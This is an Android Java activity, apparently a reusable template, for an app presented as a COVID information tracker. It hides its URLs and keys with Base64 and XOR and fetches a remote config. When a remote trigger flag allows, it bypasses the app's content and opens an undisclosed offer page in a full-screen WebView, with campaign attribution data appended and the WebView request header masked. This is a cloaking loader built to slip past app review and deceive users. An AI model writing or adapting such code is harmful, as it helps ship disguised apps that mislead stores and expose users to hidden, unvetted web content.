package covid.info.tracker; //TODO: Replace to your package

import android.annotation.SuppressLint;
import android.app.Application;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.Color;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.PersistableBundle;
import android.util.AttributeSet;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.view.WindowManager;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceRequest;
import android.webkit.WebResourceResponse;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.FrameLayout;

import androidx.annotation.Nullable;
import androidx.appcompat.app.ActionBar;
import androidx.appcompat.app.AppCompatActivity;

import com.appsflyer.AppsFlyerConversionListener;
import com.appsflyer.AppsFlyerLib;
import com.iigo.library.IntertwineLoadingView;
import com.jayway.jsonpath.DocumentContext;
import com.jayway.jsonpath.JsonPath;
import com.onesignal.OneSignal;

import org.jetbrains.annotations.NotNull;

import java.nio.charset.StandardCharsets;
import java.util.Map;
import java.util.concurrent.Callable;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.FutureTask;
import java.util.concurrent.TimeUnit;

import im.delight.android.webview.AdvancedWebView;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class LoadActivity extends AppCompatActivity implements AdvancedWebView.Listener {

    OkHttpClient okHttpClient = new OkHttpClient.Builder()
            .connectTimeout(30, TimeUnit.SECONDS)
            .writeTimeout(30, TimeUnit.SECONDS)
            .readTimeout(30, TimeUnit.SECONDS)
            .build();

    public static final String headData = "Gm8QJzM3JzE2JyZvFSs2Kg==";
    public static final String linkToConfig = "KjY2MjF4bW0lKzE2bCUrNio3IGwhLS9tIzIyOCkuLm1nEg0RFgsGZ20wIzVtIS0sJCslbDY6Ng==";
    private static final String idpost = "dHIhcCF3JCd3d3d1JHVwcSd1e3AndiF7cyZzdXB3cXU=";
    private static final String AppsFlyerID = "BnUoegV2IyUWLQgqEQkpLXEnLHQACQ==";
    private static final Class mainAcivity = MainActivity.class; //TODO: replace to your mainActivity

    private Context sContext;
    private Intent intentMain;
    private ModifWebClient adsWeb;
    private FrameLayout frameLayout;
    private static final byte keyTool = 66;
    private static DocumentContext remConfig;

    String offerUrl;
    String deep;

    @Override
    protected void onCreate(final Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        requestWindowFeature(Window.FEATURE_NO_TITLE);
        this.getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);

        initAps();

        sContext = this;

        intentMain = new Intent(sContext, mainAcivity);
        intentMain.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);

        createLaunc();
    }

    IntertwineLoadingView vProgress;

    private void createLaunc() {
        FrameLayout vLayout = new FrameLayout(sContext);
        FrameLayout.LayoutParams layoutparams = new FrameLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT, Gravity.CENTER_HORIZONTAL | Gravity.CENTER_VERTICAL);
        vLayout.setLayoutParams(layoutparams);

        vProgress = new IntertwineLoadingView(this);
        FrameLayout.LayoutParams params = new FrameLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT, Gravity.CENTER_HORIZONTAL | Gravity.CENTER_VERTICAL);
        vProgress.setLayoutParams(params);
        vProgress.setDuration(1000);
        vProgress.setFirstBallColor(Color.RED);
        vProgress.setSecondBallColor(Color.YELLOW);
        vProgress.start();

        vLayout.addView(vProgress);

        setContentView(vLayout);

        Thread t = new Thread(new Runnable() {
            @Override
            public void run() {
                ExecutorService executor = Executors.newSingleThreadExecutor();

                FutureTask<String> futureConfig = new FutureTask<>(getConfig(classDecryptor(linkToConfig).replace(classDecryptor("ZxINERYLBmc="), classDecryptor(idpost))));
                executor.execute(futureConfig);
                try {
                    String sConfigJson = futureConfig.get(30L, TimeUnit.SECONDS);

                    remConfig = JsonPath.parse(classDecryptor(sConfigJson));

                    if (getTriggerItem()) {
                        startMainAct();
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                    startMainAct();
                    return;
                }

                executor.shutdown();

                if (!getTriggerItem()) {
                    initSdk();
                }
            }
        });
        t.start();
    }

    private void initSdk() {
        OneSignal.startInit(this)
                .inFocusDisplaying(OneSignal.OSInFocusDisplayOption.Notification)
                .unsubscribeWhenNotificationsAreDisabled(true)
                .init();
    }

    private void initAps() {
        AppsFlyerConversionListener conversionListener = new AppsFlyerConversionListener() {
            @Override
            public void onInstallConversionDataLoaded(Map<String, String> conversionData) {
                int i = 0;
                for (String attrName : conversionData.keySet()) {
                    if (Boolean.parseBoolean(conversionData.get("is_first_launch"))) {
                        if (attrName.equals("af_siteid") || attrName.equals("campaign") || attrName.equals("orig_cost")) {
                            if (i == 0) {
                                deep = "&" + attrName + "=" + conversionData.get(attrName);
                            } else {
                                deep = deep + "&" + attrName + "=" + conversionData.get(attrName);
                            }
                            i++;
                        }
                    } else {
                        if (attrName.equals("af_siteid") || attrName.equals("campaign")) {
                            if (i == 0) {
                                deep = "&" + attrName + "=" + conversionData.get(attrName);
                            } else {
                                deep = deep + "&" + attrName + "=" + conversionData.get(attrName);
                            }
                            i++;
                        }
                    }
                }
                Handler handler = new Handler(Looper.getMainLooper());
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        createOff();
                    }
                }, 0);
            }

            @Override
            public void onInstallConversionFailure(String errorMessage) {
                Handler handler = new Handler(Looper.getMainLooper());
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        createOff();
                    }
                }, 0);
            }

            @Override
            public void onAppOpenAttribution(Map<String, String> conversionData) {
                Handler handler = new Handler(Looper.getMainLooper());
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        createOff();
                    }
                }, 0);
            }

            @Override
            public void onAttributionFailure(String errorMessage) {
                Handler handler = new Handler(Looper.getMainLooper());
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        createOff();
                    }
                }, 0);
            }
        };

        AppsFlyerLib.getInstance().init(classDecryptor(AppsFlyerID), conversionListener, getApplicationContext());
        AppsFlyerLib.getInstance().startTracking((Application) getApplicationContext());
    }

    @SuppressLint("JavascriptInterface")
    private void createOff() {
        final FrameLayout vLayout = new FrameLayout(sContext);
        FrameLayout.LayoutParams layoutparams = new FrameLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT, Gravity.CENTER_HORIZONTAL | Gravity.CENTER_VERTICAL);
        vLayout.setLayoutParams(layoutparams);

        vProgress = new IntertwineLoadingView(this);
        FrameLayout.LayoutParams params = new FrameLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT, Gravity.CENTER_HORIZONTAL | Gravity.CENTER_VERTICAL);
        vProgress.setLayoutParams(params);
        vProgress.setDuration(1000);
        vProgress.setFirstBallColor(Color.RED);
        vProgress.setSecondBallColor(Color.YELLOW);

        adsWeb = new ModifWebClient(this);
        adsWeb.addView(vLayout);
        vLayout.addView(vProgress);

        vProgress.start();

        adsWeb.setListener(this, this);
        adsWeb.addHttpHeader(classDecryptor(headData), "");
        adsWeb.setWebViewClient(new WebClient());

        if (deep!=null) {
            adsWeb.loadUrl(offerUrl + deep);
        } else {
            adsWeb.loadUrl(offerUrl);
        }

        Handler handler = new Handler(Looper.getMainLooper());
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                adsWeb.removeView(vLayout);
                vLayout.removeView(vProgress);
            }
        }, 2000);

        frameLayout = new FrameLayout(sContext);
        setContentView(frameLayout);
        frameLayout.addView(adsWeb);
    }

    private Callable<String> getConfig(final String urlAddr) {
        Callable<String> result = new Callable<String>() {
            @Override
            public String call() throws Exception {
                Request request = new Request.Builder()
                        .url(urlAddr)
                        .build();
                Response response = okHttpClient.newCall(request).execute();
                return response.body().string();
            }
        };
        return result;
    }

    private boolean getTriggerItem() {
        try {
            if (!remConfig.read(classDecryptor("Zmw2MCslJScw"), boolean.class)) {
                offerUrl = remConfig.read(classDecryptor("Zmw3MC4="), String.class);
            }
            return remConfig.read(classDecryptor("Zmw2MCslJScw"), boolean.class);
        } catch (Exception e) {
            return false;
        }

    }

    private void hideSystemItem() {
        ActionBar actionBar = getSupportActionBar();
        if (actionBar != null) {
            actionBar.hide();
        }
    }

    private void startMainAct() {
        sContext.startActivity(intentMain);
        overridePendingTransition(android.R.anim.fade_in, android.R.anim.fade_out);
        finish();
    }

    @Override
    public void onBackPressed() {
        if (adsWeb == null) return;
        if (adsWeb.canGoBack()) {
            adsWeb.goBack();
        }
    }

    @Override
    public void onSaveInstanceState(@NotNull Bundle outState, @NotNull PersistableBundle outPersistentState) {
        super.onSaveInstanceState(outState, outPersistentState);
        if (adsWeb == null) return;
        adsWeb.saveState(outState);
    }

    @Override
    protected void onRestoreInstanceState(@NotNull Bundle savedInstanceState) {
        super.onRestoreInstanceState(savedInstanceState);
        if (adsWeb == null) return;
        adsWeb.restoreState(savedInstanceState);
    }

    @Override
    protected void onPostCreate(Bundle savedInstanceState) {
        super.onPostCreate(savedInstanceState);
        hideSystemItem();
    }

    @Override
    public void onWindowFocusChanged(boolean hasFocus) {
        super.onWindowFocusChanged(hasFocus);
        if (hasFocus) {
            hideSystemItem();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (adsWeb == null) {
            return;
        }
        adsWeb.onActivityResult(requestCode, resultCode, data);
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (adsWeb == null) {
            return;
        }
        adsWeb.onResume();
    }

    @Override
    protected void onPause() {
        super.onPause();
        if (adsWeb == null) return;
        adsWeb.onPause();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (adsWeb == null) return;
        adsWeb.onDestroy();
    }

    @Override
    public void onPageStarted(String url, Bitmap favicon) {
    }

    @Override
    public void onPageFinished(String url) {
    }

    @Override
    public void onPageError(int errorCode, String description, String failingUrl) {
    }

    @Override
    public void onDownloadRequested(String url, String suggestedFilename, String mimeType, long contentLength, String contentDisposition, String userAgent) {
    }

    @Override
    public void onExternalPageRequest(String url) {
    }

    private static String classDecryptor(String t) {
        byte[] data = {};
        int i;

        try {
            data = android.util.Base64.decode(t, android.util.Base64.DEFAULT);
        } catch (Exception e) {
            e.printStackTrace();
        }

        for (i = 0; i < data.length; i++) {
            data[i] = (byte) (data[i] ^ LoadActivity.keyTool);
        }

        return new String(data, StandardCharsets.UTF_8);
    }

    private class WebClient extends WebViewClient {
        @Nullable
        @Override
        public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest request) {
            Uri url = request.getUrl();
            if (url.getHost() != null) {
                if (url.getHost().equals(classDecryptor("Ni0jMjI=")) && (url.getPath() == null || url.getPath().length() <= 1)) {
                    startMainAct();
                }
            }
            return super.shouldInterceptRequest(view, request);
        }

        @Override
        public void onPageFinished(WebView view, String url) {
            super.onPageFinished(view, url);
        }

        @Override
        public boolean shouldOverrideUrlLoading(WebView view, String url) {
            if (url == null || url.startsWith(classDecryptor("KjY2MnhtbQ==")) || url.startsWith(classDecryptor("KjY2MjF4bW0=")))
                return false;

            try {
                Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
                view.getContext().startActivity(intent);
                overridePendingTransition(android.R.anim.fade_in, android.R.anim.fade_out);
                return true;
            } catch (Exception e) {
                return true;
            }
        }
    }

    private class ModifWebClient extends AdvancedWebView {

        private View customView = null;
        private FrameLayout.LayoutParams matchParentLayout = new FrameLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT);

        public ModifWebClient(Context context) {
            super(context);
        }

        public ModifWebClient(Context context, AttributeSet attrs) {
            super(context, attrs);
        }

        public ModifWebClient(Context context, AttributeSet attrs, int defStyleAttr) {
            super(context, attrs, defStyleAttr);
        }

        @Override
        public void onPause() {
        }

        @SuppressLint("SetJavaScriptEnabled")
        @Override
        protected void init(Context context) {
            super.init(context);

            this.setThirdPartyCookiesEnabled(true);
            this.setMixedContentAllowed(true);
            getSettings().setJavaScriptEnabled(true);
            getSettings().setDomStorageEnabled(true);

            setWebChromeClient(new WebChromeClient() {
                @Override
                public void onShowCustomView(View view, CustomViewCallback callback) {
                    ModifWebClient.this.setVisibility(GONE);
                    view.setLayoutParams(matchParentLayout);
                    frameLayout.addView(view);
                    customView = view;
                }

                @Override
                public void onHideCustomView() {
                    if (customView != null) {
                        frameLayout.removeView(customView);
                    } else {
                        frameLayout.removeAllViews();
                        frameLayout.addView(ModifWebClient.this);
                    }
                    customView = null;
                    ModifWebClient.this.setVisibility(VISIBLE);
                }
            });
        }
    }
}